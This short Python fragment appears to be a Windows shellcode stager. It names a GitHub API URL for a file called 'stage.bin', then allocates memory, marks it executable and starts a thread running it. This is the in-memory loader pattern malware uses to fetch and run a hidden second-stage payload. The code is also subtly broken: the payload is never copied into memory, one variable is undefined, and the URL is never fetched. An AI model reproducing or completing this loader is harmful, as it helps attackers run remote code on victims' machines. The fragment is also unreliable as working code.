API = 'https://api.github.com/repos/example/project/contents/stage.bin'
def stage(kernel32, data):
    memory = kernel32.VirtualAlloc(0, len(data), 0x3000, 4)
    kernel32.VirtualProtect(memory, len(data), 0x20, old_permissions)
    kernel32.CreateThread(0, 0, memory, 0, 0, 0)
